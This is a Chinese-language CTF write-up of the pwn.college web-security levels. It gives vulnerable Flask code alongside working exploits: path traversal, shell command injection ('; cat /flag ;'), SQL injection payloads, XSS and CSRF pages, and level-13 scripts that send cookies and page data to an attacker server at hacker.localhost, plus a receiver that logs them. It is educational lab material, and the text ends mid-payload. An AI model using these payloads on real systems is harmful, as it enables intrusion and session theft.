---
title: PWN-College-WebSecurity-Writeup
date: 2024-07-08 11:02:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - 逆向
---
# pwn.college

https://pwn.college/intro-to-cybersecurity/web-security/

## 有价值的问题

### 1. 重定向和直接请求的区别？
- Flask 重定向处理：
  Flask 的 redirect 函数是 HTTP 协议中的一个特性，它向浏览器发送一个 302 响应码，并告诉浏览器去访问另一个 URL。这和直接在服务器端发送一个请求是有区别的。使用 redirect 是让客户端（如浏览器）去访问新的 URL，而不是服务器端发起请求。

- 直接请求和重定向的区别：
  如果你直接在服务器端重新发送请求，需要使用 requests 库来实现，而不是使用 Flask 的 redirect 函数。重定向是让浏览器去访问新的 URL，而直接请求则是服务器端自己去访问 URL 并处理响应。

### 2. 为什么提交表单的形式不会出现跨域的问题？

跨域问题（CORS, Cross-Origin Resource Sharing）主要与浏览器的同源策略有关。浏览器默认会阻止一个域名的网页通过脚本（例如JavaScript）与另一个域名的服务器进行交互，除非目标服务器明确允许这种行为。以下是两种情况的详细解释：

- 使用 JavaScript 处理重定向
当你使用 JavaScript 来发送跨域请求时，例如使用 fetch 或 XMLHttpRequest，浏览器会触发 CORS 检查。跨域请求会受到以下限制：

1. 预检请求：对于某些类型的请求（例如带有自定义头部或使用非简单方法如 POST、PUT 等），浏览器会先发送一个 OPTIONS 请求来“预检”服务器是否允许该请求。如果服务器响应不允许，实际的请求将不会被发送。
2. 响应头部要求：目标服务器需要在响应中设置适当的 CORS 头部，例如 Access-Control-Allow-Origin，以指示允许的跨域来源。
如果没有正确处理 CORS 头部，浏览器将会阻止请求并抛出跨域错误。

- 使用表单提交
当你使用 HTML 表单提交（例如通过 <form> 标签），浏览器的行为有所不同：

1. 表单提交是“简单请求”：HTML 表单提交被视为“简单请求”，因为它们不带有复杂的 HTTP 头部，并且使用的方法（如 GET、POST）也被视为简单方法。
2. 浏览器不进行预检请求：由于表单提交是简单请求，浏览器不会进行预检请求（OPTIONS），因此不会触发跨域检查。
3. 重定向处理：在表单提交的情况下，如果目标服务器返回重定向（例如 302 重定向），浏览器会自动处理重定向，而不涉及跨域问题。
```javascript
  具体示例
  JavaScript 跨域请求示例
  复制代码
  fetch('http://example.com/api', { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key: 'value' })
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
  如果 http://example.com 服务器没有正确设置 CORS 头部，这个请求会被浏览器阻止，并抛出跨域错误。

  表单提交示例
  html
  复制代码
  <form action="http://example.com/api" method="POST">
    <input type="hidden" name="key" value="value">
    <input type="submit" value="Submit">
  </form>
  浏览器会直接提交表单到 http://example.com/api，即使是跨域请求，也不会受到 CORS 限制。
```
- 总结
JavaScript 处理重定向时出现跨域问题：因为浏览器会进行 CORS 检查，并需要服务器正确设置 CORS 头部。表单提交没有跨域问题：因为表单提交被视为简单请求，浏览器不会进行预检请求，也不涉及复杂的头部设置。这就是为什么使用表单提交时不会出现跨域问题，而使用 JavaScript 处理重定向时可能会遇到跨域问题的原因。


表单提交请求被算作是简单请求的原因。表单提交的请求算作是“简单请求”的原因在于，HTTP 规范和浏览器的同源策略定义了哪些请求类型可以被认为是“简单请求”。具体来说，简单请求是指符合某些条件的HTTP请求，这些条件使得请求被认为是不会对服务器或数据安全性构成重大风险。

- 什么是简单请求
  - 根据 CORS 规范，一个HTTP请求被认为是“简单请求”，必须满足以下条件：

1. 请求方法：
  - 仅限于 GET、HEAD 或 POST。
  - HTTP 头部：

2. 请求中所使用的头部字段仅限于以下几种不自定义的标准字段：
  - Accept
  - Accept-Language
  - Content-Language
  - Content-Type（但仅限于 text/plain, multipart/form-data, 或 application/x-www-form-urlencoded）

3. 如果使用 POST 方法，请求的 Content-Type 头部必须是以下之一：
  - text/plain
  - multipart/form-data
  - application/x-www-form-urlencoded

这些限制条件确保了请求的内容和头部都是简单且安全的，不会对服务器构成跨站点脚本攻击（XSS）或其他潜在的威胁。



### 3. level13中学习到的

#### 3.1 
URL编码的过程中，有可能把空格编码成+，这样的话，如果你的xss payload中包含空格，会导致xss payload无法正确被解析。还是要把他编码为%20比较保险。具体可以看这个连接中的例子。https://www.w3schools.com/tags/ref_urlencode.ASP

#### 3.2 
`response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization`。Access-Control-Allow-Headers 是一个 CORS（跨域资源共享）响应头，用于指定服务器允许客户端请求中使用的 HTTP 头字段。这个头字段在处理预检请求时特别重要，它告诉浏览器哪些自定义请求头是被服务器允许的。

也就是说，你自定义的请求头，只能设定的里面。如果不在，跨域请求不会成功。第一开始，我就一直没设置对，一直想着使用cookie字段传过去，然后response.headers["Access-Control-Allow-Headers"]中也没设置Cookies所以一直没传过去。
当我设置Cookies之后，是可以传递过去的。

![20240707103454](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707103454.png)

然后hacker那边也可以正确接收。

![20240707103717](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707103717.png)

#### 3.3 关于调试

这些题目是我在本地进行调试之后才发现的解决方案。虽然这个过程不是真实的攻击环境，但秉承着学习知识的态度，这种方式确实最有效最节约时间的。以后卡住了，不要死扣，开始本地调试，然后发现之前卡住的原因才是最关键的。


### 4. level15 

python中可以加载C语言的共享库，加载完成之后，C语言的共享库中的函数就可以像python函数一样进行调用。ctypes 是 Python 标准库中的一个模块，它提供了与 C 语言兼容的数据类型，并允许调用动态链接库（DLLs）或共享库（Shared Libraries）。ctypes 使得 Python 能够直接调用用 C 语言编写的库中的函数，这对需要高性能或特定平台功能的应用非常有用。

URL 参数中可以传递 Latin-1 编码的字符串，但需要对其进行 URL 编码以确保特殊字符不会导致传输问题。URL 编码将特殊字符转换为 % 后跟两个十六进制数字的形式。

```python
import requests
import urllib.parse

# 假设你有一些包含 Latin-1 特殊字符的字符串
latin1_string = "Hello, World! åäö"

# 将字符串编码为 Latin-1 字节串
latin1_encoded = latin1_string.encode('latin-1')

# 将字节串进行 URL 编码
url_encoded = urllib.parse.quote_from_bytes(latin1_encoded)

# 发送带有 URL 编码数据的请求
url = "http://challenge.localhost:1555/greet"
params = {"name": url_encoded}
response = requests.get(url, params=params)

# 打印响应
print(response.text)

```

对于字符串 "Hello, World! åäö"，Latin-1 编码后的字节串为：b'Hello, World! \xe5\xe4\xf6'

## level1
源码
```python
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```

利用脚本：
```python
# level 1 
headers = {
    "host":'challenge.localhost',
}
file_path = "../flag"
response = requests.get('http://challenge.localhost:80/', headers=headers, params={"path": file_path})
print(response.text)
```

## level2
源码
```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

利用脚本
```python
# level 2
# pwn.college{Qf_-LrgHRo8RcQtJZnootYJZt5J.dhDOzMDL0czNxEzW}
headers = {
    "host":'challenge.localhost',
}
time_zone = "; cat /flag ;"
response = requests.get('http://challenge.localhost:80/', headers=headers, params={"timezone": time_zone})
print(response.text)
```

## level3
源码：
```python

def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))

    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])


```

利用脚本
```python
pwn.college{YZT44ipzNzZZPUSIPj4X76UIKcy.dlDOzMDL0czNxEzW}
headers = {
    "host":'challenge.localhost',
}
for i in range(100):
    user = i
    response = requests.get('http://challenge.localhost:80/', headers=headers, params={"user": user})
    print(response.text)

```


## level4
这一关用到了session，你没有办法直接更新session。因为session是存储到服务器端的，但是这一关username 和password被拼接在字符串中了。所以可以直接利用sql注入。
源码

```python
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])

```

利用代码
```python
login_data = {
    'username': 'flag',
    'password': '" OR "1"="1'
}
response = requests.post('http://challenge.localhost:80/', data=login_data)
print(response.text)

```

## level5

存在SQL注入点--可以构造sql语句
  `SELECT username FROM users WHERE username LIKE '%' UNION SELECT username || ' - ' || password FROM users WHERE '1'='1'--`


源码
```python

def level5():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall() # 拼接字符串
    return "".join(f'{user["username"]}\n' for user in users)
```

利用代码：
```python
import urllib.parse
query = "flag \"  UNION SELECT username || ' - ' || password FROM users WHERE '1'='1'-- \""
# query = "f%"

response = requests.get('http://challenge.localhost:80/', params={"query": query})
print(response.text)

hacker@web-security~level5:~$ /bin/python /home/hacker/Web/level3.py
flag - pwn.college{czX-TLFVwlqyikW9mfkA9La9Dd4.dFTOzMDL0czNxEzW}
```

## level6

依旧是存在sql注入点，这一关把users表名给hash了，我们不能直接通过上一关的sql注入，直接获得答案。

观察源码发现是sqlite数据库，我们首先可以通过sqlite查询所有自建表的名称，然后根据hash字符串的特点选择。

获得表名之后，再进行下一步的sql注入操作。 这里要注意一点。最后的`--`是为了注释掉没有闭合的双引号`"`

源码:
```python
def level6():
    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)

```

利用代码:
```python

query = "flag \"  UNION SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' --"
response = requests.get('http://challenge.localhost:80/', params={"query": query})
print(response.text)

query = "flag \"  UNION SELECT username || ' - ' || password FROM 'table6301237404136328429' WHERE '1'='1'-- \""
response = requests.get('http://challenge.localhost:80/', params={"query": query})
print(response.text)

# table6301237404136328429

# flag - pwn.college{8SaDDkYZvBuqJQ_N-4fk3MgZPfE.dJTOzMDL0czNxEzW}
```

## level7 

应该不是正确的解法，感觉正确的解法里面，我是看不到服务器端错误回显的。但是在浏览器中访问的时候，发现也能获取到错误回显。就先这样把。

理论上来讲，我应该把username字段更新为username-password的拼接字符串，这样会用到update语句，这样会变成同时运行select和update语句，而sqlite不允许这样。

我选择把`username-password`拼接以后的字段作为rowid，这样的话，flag会在报错中回显。

源码:

```python

def level7():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

利用代码：
```python
login_data = {
    'username': 'w',
    'password': " \" AND '1'='0'UNION SELECT (SELECT username || ' - ' || password FROM users WHERE username='flag'),* FROM users WHER username='flag' --"
}
response = requests.post('http://challenge.localhost:80/', data=login_data)
print(response.text)

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/challenge/run", line 671, in catch_all
    return challenge()
  File "/challenge/run", line 177, in level7
    session["user"] = int(user["rowid"])
ValueError: invalid literal for int() with base 10: 'flag - pwn.college{wTBGaZe76xiwOq7ylUDY0k3qlPK.dNTOzMDL0czNxEzW}'
```


## level8

我们需要对url传入一个地址，让其能弹出alter窗口。地址可以设定为echo，然后利用html(echo)，将echo设定为`<script type='text/javascript'>alert('This is an alert');</script>`即可。

那为什么说是跨站脚本呢，意思大概是，我可以通过你提供的服务，访问一个我设定的有漏洞的网站。这样有可能泄露一些不应该暴露的逻辑。

源码：
```python
def level8():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```


## leve9 

这一次跟之前是一样的，唯一不同的是，echo的内容被`<textarea>`标签给括起来了。我们可以选择闭合这个`textarea标签`

`</textarea><script type='text/javascript'>alert('This is an alert');</script><textarea>`
源码:

```python
def level9():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(f"<textarea>{echo}</textarea>")

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```


## level10

1. 访问 http://challenge.localhost/visit?url=http://challenge.localhost/leak,让它自己登录，同时设置leak=Ture
2. 访问 http://challenge.localhost/info?user=1， 由于leak是更改的数据库，所以这里依旧保持。至于user的值，我是随便尝试的。

本来我是想着利用，echo将rowid显示出来，但是不知道怎么做。

`<script type="text/javascript">alter(sessionData = {session_data})</script>`
源码:
```python

def level10():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
```


## level11

这一关跟上一关的区别，跨站url的主机名设置为了`hacker.loaclhost`，而这个域名是不提供服务的。那我们需要启动一个hacker服务器，让它运行在`hacker.localhost`上。在访问challenge的visit时，将url设置为`hacker.localhost:81`,在hacker服务器，将这个请求重定向到challenge服务器的leak路由即可。

这里需要注意的是，为什么我在hacker服务端，重新发送请求到challenge的leak端口不行，但是重定向到leak就可以。

原因如下：
```text
Flask 重定向处理：
Flask 的 redirect 函数是 HTTP 协议中的一个特性，它向浏览器发送一个 302 响应码，并告诉浏览器去访问另一个 URL。这和直接在服务器端发送一个请求是有区别的。使用 redirect 是让客户端（如浏览器）去访问新的 URL，而不是服务器端发起请求。

直接请求和重定向的区别：
如果你直接在服务器端重新发送请求，需要使用 requests 库来实现，而不是使用 Flask 的 redirect 函数。重定向是让浏览器去访问新的 URL，而直接请求则是服务器端自己去访问 URL 并处理响应。
```

**如果是服务端重新请求，那么因为跨域的问题，session无法保留。但是如果是浏览器访问新的URL，那么以前登录的session将可以使用。这样访问leak的时候，不会显示没有登录的报错了。**

源码：
```python
def level11():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f"Invalid `url`, hostname should be `{hacker_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    return "Not Found\n", 404

```





## level12

这一关于与上一关的区别是，在请求leak的时候，方法必须是POST方法。所以简单的重定向无法正确请求leak，简单重定向的请求方法是`GET`。

所以，我们选择在hacker服务器上增加一个网页，在访问challenge.localhost的visit路由时，先访问这个网页，然后由这个网页处理重定向，再将网页重定向到challenge.localhost的leak路由下。但是这里有一个问题，如果你直接使用JS代码中的fetch处理重定向请求，会出现跨域的问题。

解决的方案就是，设置一个表单，在网页加载完成之后，自动提交这个表单。这样的话不会出现跨域的问题

源码：
```python
def level12():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak" and request.method == "POST":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f"Invalid `url`, hostname should be `{hacker_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    return "Not Found\n", 404

```

利用代码
```python
服务器：
from flask import Flask, redirect, request, session, render_template
import requests
import http.client

app = Flask(__name__)


@app.route('/')
def index():
    # 创建一个访问challenge.localhost的请求
    return render_template("index.html")
    # challenge_url = "http://challenge.localhost/leak"
    # return redirect(challenge_url)

@app.route('/leak')
def index1():
    # 创建一个访问challenge.localhost的请求
    challenge_url = "http://challenge.localhost/leak"
    return redirect(challenge_url)

if __name__ == '__main__':
    app.secret_key = "test"
    app.run(host="hacker.localhost", port=81)

```

网页:
```html


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Flask App</title>
</head>
<body>
    <h1>Welcome to My Flask App!</h1>
    <p>This is a simple example of a rendered HTML page using Flask.</p>
    <form id="myForm" action="http://challenge.localhost/leak" method="POST" style="display:none;">
      <input type="hidden" name="key" value="value">
    </form>
    <button id="myButton" style="display:none;">Click me</button>
</body>
<script>
    document.addEventListener('DOMContentLoaded', (event) => {
    const button = document.getElementById('myButton');
    
    button.addEventListener('click', () => {
      const form = document.getElementById('myForm');
      form.submit();
    });
    
    fetch('http://hacker.localhost:81/leak', { method: 'GET', redirect: 'manual' })
    .then(response => {
      // 自动触发按钮点击事件
      button.click();
    })
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error))

  });
;

</script>
</html>
```

如果你的js代码写成这样，会出现跨域的问题

```html

<script>
  fetch('http://hacker.localhost:81/leak', { method: 'GET', redirect: 'manual' })
    .then(response => {

      const redirectUrl = "http://challenge.localhost/leak";
      // 发送 POST 请求到重定向的目标 URL
      return fetch(redirectUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
      });
    })
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));

</script>

```


## level13

这个题跟之前的很像，只不过现在没有leak函数了。需要拿到session作为cookie传递过去，才能获得正确的flag。

有两种做法

1. 原网页存在xss漏洞，我们可以利用xss payload获取cookie，将cookie传递到hacker.localhost机器上去。然后再带着cookie访问challenge.localhost的info接口

![20240707101602](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707101602.png)

2. 将传递给echo接口的payload设置为先利用fetch请求challenge.localhost的info接口（**由于同源会自带cookie访问**），然后将接口响应放在Authorization字段里传递给hacker。

![20240707101549](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707101549.png)

源码：
```python
def level13():
    app.config['SESSION_COOKIE_HTTPONLY'] = False

    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/info":
        session_user_id = int(session.get("user", -1))
        session_user = db.execute("SELECT * FROM users WHERE rowid = ?", (session_user_id,)).fetchone()

        request_user_id = int(request.args.get("user", session_user_id))
        request_user = db.execute("SELECT * FROM users WHERE rowid = ?", (request_user_id,)).fetchone()
        assert request_user, "Invalid `user`"

        info = [request_user["username"]]
        if request_user_id == session_user_id:
            info.append(request_user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404

```


利用源码

```html
方法1：
    <script>
        all = `${document.cookie}`;
        fetch('http://hacker.localhost:81/', {
            method: 'GET',
            credentials: 'include',
            headers:{
                "Authorization": all
            }
        })
    </script>
方法2：
<script>
    fetch('http://challenge.localhost/info', {
        method: 'GET',
        credentials: 'include'
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text();
    })
    .then(data => {
        console.log('Info response:', data);
        return fetch('http://hacker.localhost:81', {
            method: 'GET',
            credentials: 'include',
            headers: {
                "Authorization": data
            },
        });
    })
</script>
```

两种方式的hacker都是相同的

```python
from flask import Flask, redirect, request, session, render_template, make_response
import requests
import http.client

app = Flask(__name__)
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = 'http://challenge.localhost'  # 指定允许的来源
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization' # 注意这里的请求头！
    response.headers['Access-Control-Allow-Credentials'] = 'true'  # 允许发送凭证
    return response

@app.after_request
def after_request(response):
    return add_cors_headers(response)

@app.route('/', methods=['GET', 'POST', 'OPTIONS'])
def index():
    if request.method == 'OPTIONS':
        # 处理预检请求
        response = make_response()
        return add_cors_headers(response)
    
    if request.method == 'POST' or request.method == 'GET':
        # 打印所有请求头
        headers = request.headers
        for header, value in headers.items():
            print(f'{header}: {value}')
        
        # 获取并打印所有 Cookie
        cookies = request.cookies
        print(f"cookie:{cookies}")
        for cookie, value in cookies.items():
            print(f'{cookie}: {value}')
        
        response = make_response()
        return add_cors_headers(response)
    else:
        response = make_response("Unsupported method")
        return add_cors_headers(response)

if __name__ == '__main__':
    app.secret_key = "test"
    app.run(host="hacker.localhost", port=81)

```


发送请求：
```python
echo = "%3Cscript%3E%20%20%20%20%20fetch('http%3A%2F%2Fchallenge.localhost%2Finfo'%2C%20%7B%20%20%20%20%20%20%20%20%20method%3A%20'GET'%2C%20%20%20%20%20%20%20%20%20credentials%3A%20'include'%20%20%20%20%20%7D)%20%20%20%20%20.then(response%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20if%20(!response.ok)%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Error('Network%20response%20was%20not%20ok')%3B%20%20%20%20%20%20%20%20%20%7D%20%20%20%20%20%20%20%20%20return%20response.text()%3B%20%20%20%20%20%7D)%20%20%20%20%20.then(data%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20console.log('Info%20response%3A'%2C%20data)%3B%20%20%20%20%20%20%20%20%20return%20fetch('http%3A%2F%2Fhacker.localhost%3A81'%2C%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20'GET'%2C%20%20%20%20%20%20%20%20%20%20%20%20%20credentials%3A%20'include'%2C%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22Authorization%22%3A%20data%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%20%20%20%20%20%20%20%20%7D)%3B%20%20%20%20%20%7D)%20%20%20%20%20.then(response%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20if%20(!response.ok)%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Error('Network%20response%20was%20not%20ok')%3B%20%20%20%20%20%20%20%20%20%7D%20%20%20%20%20%20%20%20%20return%20response.json()%3B%20%20%20%